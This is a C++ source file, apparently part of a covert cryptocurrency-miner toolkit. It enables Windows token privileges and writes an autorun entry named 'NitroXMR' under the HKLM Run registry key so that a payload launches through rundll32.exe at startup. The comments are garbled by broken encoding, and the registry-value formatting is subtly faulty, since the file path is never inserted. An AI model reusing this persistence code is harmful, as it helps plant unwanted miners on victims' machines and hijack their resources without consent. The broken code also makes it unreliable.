#include "stdafx.h"
#include "ToolKit.h"

// executePath

//��Ȩ����������exp��

BOOL CToolKit::IsKeyEdit()
{
	CRegKey reg;        //����ע������

	
	if (TRUE == SetPrivilege(SE_CREATE_GLOBAL_NAME, TRUE))
	{
		printf("[+] Creat Privilege OK \n");
	}

	if (TRUE == SetPrivilege(SE_BACKUP_NAME, TRUE))
	{
		printf("[+] Backup Privilege OK \n");
	}
	
	if (ERROR_SUCCESS == reg.Open(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
	{

		printf("[+] Open Reg OK \n");
		bKeyEdit = TRUE;
		reg.Close();
	}
	else
	{
		bKeyEdit = FALSE;
		printf("[-] Open Reg Failed\n");
	}

	
	return bKeyEdit;
}



BOOL CToolKit::setAutoRun(PCWSTR szFileFullPath)
{
	CString exePath;
	CRegKey reg;        //����ע������

						//HKEY hK;
						//RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
						//	0, KEY_WRITE | KEY_READ, &hK);
						//printf("%d\n", hK);
						//RegCloseKey(hK);

						//���ﾹȻ�Զ�����Software\\WOW6432node\\Microsoft\\Windows\\CurrentVersion\\Run
						//�����˰������˵��ô��ÿ�д�������û��!!!!!!F**K
						//����atl��,����Ҳͦ����

	if (ERROR_SUCCESS == reg.Open(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
	{
		printf("[+] Open Reg OK \n");

		HKEY hKey = reg.m_hKey;
		if (ERROR_SUCCESS == reg.Create(hKey, L"Test", REG_NONE))
		{
			printf("%d\n", reg.m_hKey);

			//Ӧ�ô���������������ȴ����
			//GetModuleFileName(NULL, executePath, MAX_PATH);
			
			TCHAR keyValue[64];

			wsprintf(keyValue, L"rundll32.exe", szFileFullPath);

			reg.SetStringValue(L"NitroXMR", keyValue);

			printf("[+] Write Reg OK\n");

		}
		else
		{
			printf("[-] Write Reg Failed\n");
		}
		reg.Close();
		return TRUE;
	}
	else
	{
		printf("[-] Open Reg Failed\n");
	}
	return FALSE;
}

BOOL CToolKit::SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (OpenProcessToken(::GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken) == 0)
	{
		return FALSE;
	}

	if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
	{
		CloseHandle(hToken);
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		CloseHandle(hToken);
		return FALSE;
	}
	return TRUE;
}
